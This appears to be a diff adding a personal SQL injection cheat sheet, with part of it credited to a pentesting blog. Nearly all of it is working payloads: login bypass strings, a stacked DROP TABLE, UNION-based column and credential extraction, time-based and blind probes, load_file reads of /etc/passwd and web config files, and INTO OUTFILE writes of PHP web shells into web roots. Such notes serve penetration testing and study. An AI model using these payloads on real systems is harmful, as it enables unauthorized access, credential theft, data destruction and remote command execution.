@@ -1,0 +1,165 @@
+sql injection.
+
+Same idea as command injection, but instead of a shell you're using user input directly in a sql query.
+
+Username: admin'--
+
+other variations
+admin' --
+admin' #
+admin'/*
+
+will turn into SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
+-- is a comment, so it just returns the admin user, letting you in.
+
+ID: 10; DROP TABLE members --
+
+You might have a query parameter in a url like ID that's getting used to grab a user
+from the db
+similar idea, ; stacks queries, -- blocks everything after, so it just drops the table
+Test for this by changing ?id=5 in a url to ?id=5%27 and seeing if you get an error
+
+the classic:
+
+Password: ' or 1=1/*
+
+Other variations
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+' closes the password string, and you're doing an or with a statement that is always true, then putting a comment string to ignore
+anything after.
+
+getting column names
+
+ HAVING 1=1 --
+' GROUP BY table.columnfromerror1 HAVING 1=1 --
+' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --
+' GROUP BY table.columnfromerror1, columnfromerror2, columnfromerror(n) HAVING 1=1 --
+
+getting column order
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY N--
+
+this is needed for UNION based injection.
+
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+is a similar idea, you keep adding nulls until you match the number of columns and you no longer get an error message.
+
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'--
+
+will help you find which columns support string datatypes
+
+The idea here is once you get the parameters right, you can retrieve data from the db
+
+' UNION SELECT username, password FROM users--
+
+mysql database, I want to get the names of the columns
+
+' UNION SELECT table_name, column_name, <comma-seperated nulls to match # of cols from table in the first part of the query> FROM information_schema.columns
+
+--from cobalt.io https://cobalt.io/blog/a-pentesters-guide-to-sql-injection-sqli
+
+-----------|--------------------------------------------------------     
+Detection: | aa' --
+           | aa' #
+           | aa'/*
+           | ' or 1=1--
+           | ' or 1=1#
+           | ' or 1=1/*
+           | ') or '1'='1--
+           | ') or ('1'='1--
+-----------|--------------------------------------------------------
+Number     | ?id=1 order by <number> #
+of columns:| (Keep increasing number until you get an error, 
+           | the last number that doesn’t give you an error
+           | is the # of columns)
+-----------|--------------------------------------------------------
+Version:   | ?id=1 union select 1,version(),3,4 #
+           | id=1 UNION SELECT null,@@version,null,null
+           | id=3 and substring(@@version,1,1)=4
+           | id=3 and substring(@@version,1,1)=5
+           | id=3 union all select 1,2,@@version,4/*
+-----------|--------------------------------------------------------
+Current    | ?id=1 union select 1,2,user(),4 #
+users:     | SELECT user(); **(Mysql)**
+           | SELECT system_user(); **(Mysql, MSSQL)**
+           | SELECT user_name(); **(MSSQL)**
+           | SELECT user; **(MSSQL, PostgreSQL)**
+           | SELECT current_user; **(PostgreSQL)**
+           | SELECT user FROM dual **(Oracle)**
+           | ') or ('1'='1--
+-----------|--------------------------------------------------------
+Tables:    | ?id=2 union select 1,table_name,3,4 
+           | from information_schema.tables
+           | SELECT * FROM information_schema.tables **(MySQL)**
+           | SELECT * FROM information_schema.tables **(MSSQL)**
+           | SELECT * FROM information_schema.tables **(PostgreSQL)**
+           | SELECT * FROM all_tables **(Oracle)**
+-----------|--------------------------------------------------------
+Columns:   | ?id=2 union select 1,column_name,3,4 from 
+           | information_schema.columns where table_name='users'
+           | SELECT * FROM information_schema.columns
+           | WHERE table_name = 'table-name' **(MySQL)**
+           | SELECT * FROM information_schema.columns
+           | WHERE table_name = 'table-name' **(MSSQL)** 
+           | SELECT * FROM information_schema.columns
+           | WHERE table_name = 'table-name' **(PostgreSQL)**
+           | SELECT * FROM all_tab_columns
+           | WHERE table_name = 'table-name' **(Oracle)**
+-----------|--------------------------------------------------------
+Time-Based:| SELECT sleep(10) **(MySQL)
+           | WAITFOR DELAY ‘0:0:10’ **(MSSQL)
+           | SELECT pg_sleep(10) **(PostgreSQL)
+           | dbms_pipe.receive_message((‘a’),10) **(Oracle)
+-----------|--------------------------------------------------------
+Blind      | ?id=3
+Injection: | ?id=3 and 1=1 **(no error)
+           | ?id=3 and 1=2 **(error)
+-----------|--------------------------------------------------------
+Extracting | cat.php?id=2 union select
+Data:      | 1,**concat(**login,0x3a,password**)**,3,4 from users
+--------------------------------------------------------------------
+Reading files:
+
+‘ union select 1,2,3, load_file(‘/etc/passwd’) ,5,6,7,8 — -
+
+‘ union select 1,2,3, load_file(‘/var/www/login.php’) ,5,6,7,8 — -
+
+‘ union select 1,2,3, load_file(‘/var/www/includes/config.inc.php’) ,5,6,7,8 — -
+
+‘ union select 1,2,3, load_file(‘/var/www/mysqli_connect.php’) ,5,6,7,8 — -
+
+--------------------------------------------------------------------
+
+Uploading files:
+
+‘ union select 1,2,3, ‘this is a test message’ ,5,6,7,8 into outfile ‘/var/www/test’ — -
+
+‘ union select 1,2,3, load_file(‘/var/www/test’) ,5,6,7,8 — -
+
+‘ union select null,null,null, “<?php system($_GET[‘cmd’]) ?>” ,5,6,7,8 into outfile ‘/var/www/shell.php’ — -
+
+‘ union select null,null,null, load_file(‘/var/www/shell.php’) ,5,6,7,8 — -
+
+--------------------------------------------------------------------
+
+Command Execution:
+
+# windows
+?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘c:/xampp/htdocs/cmd.php’
+
+# linux
+?id=1 union all select 1,2,3,4,”<?php echo shell_exec($_GET[‘cmd’]);?>”,6,7,8,9 into OUTFILE ‘/var/www/html/cmd.php’
+
+-------------------------------------------------------------------
